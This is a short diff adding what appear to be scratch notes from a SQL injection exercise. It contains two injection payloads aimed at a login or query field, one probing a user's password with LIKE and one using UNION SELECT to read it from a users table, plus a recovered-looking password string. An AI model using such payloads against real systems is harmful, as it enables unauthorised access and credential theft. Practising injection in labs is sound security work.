@@ -1,0 +1,7 @@
+t a q w e a g h j 4 - _
+') or username='turbold' and password like "4qejqqw-thgat" or ('0'='1
+
+4qejqqw-thgat
+
+') UNION SELECT 1,(SELECT password FROM users WHERE username="turbold"),1-- -
+4qejqqw-ThGAT
